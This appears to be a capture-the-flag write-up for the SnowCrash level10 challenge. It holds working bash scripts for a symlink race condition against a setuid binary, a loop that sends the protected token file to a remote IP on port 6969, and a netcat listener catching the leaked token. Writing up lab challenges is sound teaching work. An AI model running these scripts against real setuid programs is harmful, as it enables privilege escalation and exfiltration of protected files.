# LEVEL09

## Analysis

Once again let's check what we have in out directory:
```bash
    level10@SnowCrash:~$ ls -la
    total 28
    dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
    d--x--x--x  1 root    users     340 Aug 30  2015 ..
    -r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
    -r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
    -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
    -r-x------  1 level10 level10   675 Apr  3  2012 .profile
    -rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

This is what we get when we try to run the program with the token:
```bash
    level10@SnowCrash:~$ ./level10 token
    ./level10 file host
            sends file to host if you have access to it
```

There let's use the command strings to check what's inside level10:
```bash
    level10@SnowCrash:~$ strings level10
    [...]
    inet_addr
    open
    access
    strerror
    [...]
    %s file host
            sends file to host if you have access to it
    Connecting to %s:6969 .. 
    Unable to connect to host %s
    [...]
```

You can see two things.
1. The program tries to open a file and checks with access if 
you have the rights to open the file. This is a security hole we can exploit 
because of the short time interval between checking and opening the file to 
manipulate it. What we call RACE CONDITION EXPLOIT.
https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use

2. The program is trying to send a file, connecting to 6969.

## Solution
So we will next use netcat in one vm window:
```bash
    level10@SnowCrash:~$ nc -lk 6969
    # -l to specify netcat should listen on specified port, -k to stay listening after each connection.
```

In a second window create a script in /tmp to create of a file, delete it, then create a symbolic 
link to exploit the short time between these two operations. Basically, we hope that access will think that we want to open it.
Then we delete it before we create a symbolic link so that open open the token file ! Then we remove our symbolic link before create 
again because of the infinity loop.
In /tmp/script.sh:
```bash
#!/bin/bash
while true; do
        touch /tmp/link
        rm -f /tmp/link
        ln -s /home/user/level10/token /tmp/link
        rm -f /tmp/link
done
```

Then in a /tmp/spam.sh (i another vm window) we will try to open the file linked to the token 
(in a infinity loop again):
```bash
    #!/bin/bash
    while true; do
        /home/user/level10/level10 /tmp/link 192.168.186.130
    done
```

Then change both permission (the only way is to do chmod +x /tmp/file) then run both files and we get
the following:
```bash
    level10@SnowCrash:~$ nc -lk 6969
    .*( )*.
    .*( )*.
    .*( )*.
    .*( )*.
    .*( )*.
    [...]
    .*( )*.
    woupa2yuojeeaaed06riuj63c
    .*( )*.
    [...]
```

And this is out file!
```bash
    level10@SnowCrash:~$ su flag10
    Password: 
    Don't forget to launch getflag !
    flag10@SnowCrash:~$ getflag
    Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

